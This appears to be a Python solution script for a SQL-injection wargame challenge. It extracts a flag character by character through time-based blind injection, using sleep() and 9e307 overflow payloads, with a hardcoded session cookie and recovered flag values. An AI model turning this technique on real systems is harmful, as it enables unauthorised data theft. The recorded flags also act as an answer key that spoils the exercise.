#!/usr/local/bin/python3

import urllib.request
from urllib.parse import quote
import time

key = ""
for i in range(1, 50):
    for j in range(48, 127):
        url = "http://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?flag="
        data = "(case(substr(flag from {} for 1)) when '{}' then ((sleep(4)+2)*9e307) else 9e307*2 end)".format(
            str(i), chr(j))
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header(
            "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
        re.add_header("Cookie", "PHPSESSID=8mm14nl1otetnlimq9orjqa350")
        st = time.time()
        req = urllib.request.urlopen(re)
        print(req.readline());
        et = time.time()

        if et-st > 4:
            key += chr(j).lower()
            print (key)
            break
print (key)

# 67cce79cac8c768b
# cbcac5be79280c96